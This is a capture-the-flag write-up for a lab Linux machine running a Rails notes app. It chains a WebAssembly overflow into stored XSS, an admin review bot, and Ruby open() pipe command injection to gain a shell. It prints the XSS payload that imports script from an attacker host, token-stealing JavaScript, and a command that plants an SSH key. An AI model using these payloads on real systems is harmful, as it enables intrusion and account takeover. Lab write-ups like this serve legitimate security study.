## Overview

Derailed is an Insane-difficulty Linux machine running a Ruby on Rails "clipnote" app on port 3000. The path to user threads three web bugs together: a client-side-only length cap that lets a long username overflow a WebAssembly buffer into a server-rendered date field (stored XSS), an admin bot that executes that XSS, and a Rails report-download endpoint that hands an attacker-controlled path to Ruby's `open()` — which treats a leading `|` as a command. Chaining them gives a shell as the `rails` user.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22   | OpenSSH | only `ssh`-group users may log in |
| 3000 | nginx → Rails | clipnote app, `_simple_rails_session` cookie |

```bash
nmap -sC -sV -p- 10.129.228.107
curl -I http://10.129.228.107:3000/
```

The `_simple_rails_session` cookie on a `HEAD` request is the tell that we're against a Rails app. The site lets you register an account and create notes; logged-in notes show your username as the author.

## Enumeration

Notes are fetched from `/clipnotes/raw/:id` and rendered by a compiled `display(created, author)` function exported by `display.wasm`. Two details matter:

- The registration form caps the username at `maxlength="40"` — but that's enforced in HTML only. Intercepting the request lets you submit any length.
- A "report" button submits a note for an administrator to review — i.e. a headless bot will *view* the note you point it at. That's the XSS trigger.

Submitting a username longer than the WASM buffer expects overflows it, and the overflow spills into the adjacent `created` (date) string — a field the server renders **without** HTML-escaping. Using Metasploit's `pattern_create.rb` to find the offset puts the boundary at 48 bytes.

## Foothold

The payload username is 48 filler bytes plus an `<img>` that dynamically imports our JavaScript. Because it lands in the unescaped date field, it executes when the admin bot opens the reported note:

```bash
# username = 'A'*48 + <img src=x onerror=import('http://10.10.16.13:9000/e.js')>
# login fields are session[username] / session[password]
python3 drive2.py   # register payload user -> create note -> report to admin bot
```

![xss-report](/assets/Images/derailed-001_foothold_xss-report.png)

We serve `e.js` with an `Access-Control-Allow-Origin: *` header. Running in the admin's session, it reads the admin-only `/administration` page, lifts the `authenticity_token`, and POSTs to `/administration/reports`. The controller passes the `report_log` value straight to Ruby's `open()`, which spawns a subprocess when the string starts with `|` — so we set it to a command that drops our SSH key into `rails`' `authorized_keys`:

```js
// inside e.js, after stealing the token:
var rl = "|bash -c 'mkdir -p /home/rails/.ssh; echo <our-pubkey> >> /home/rails/.ssh/authorized_keys'";
P.send("authenticity_token=" + t + "&report_log=" + encodeURIComponent(rl));
```

The admin callbacks confirm the chain — `ADMINPAGE_LEN:4946` (the admin page with its token) and `POSTED_STATUS:200` (the injected command ran).

![rce-keyinstall](/assets/Images/derailed-002_foothold_rce-keyinstall.png)

With our key installed, we SSH in directly:

```bash
ssh -i id_rails rails@10.129.228.107
id   # uid=1000(rails)
```
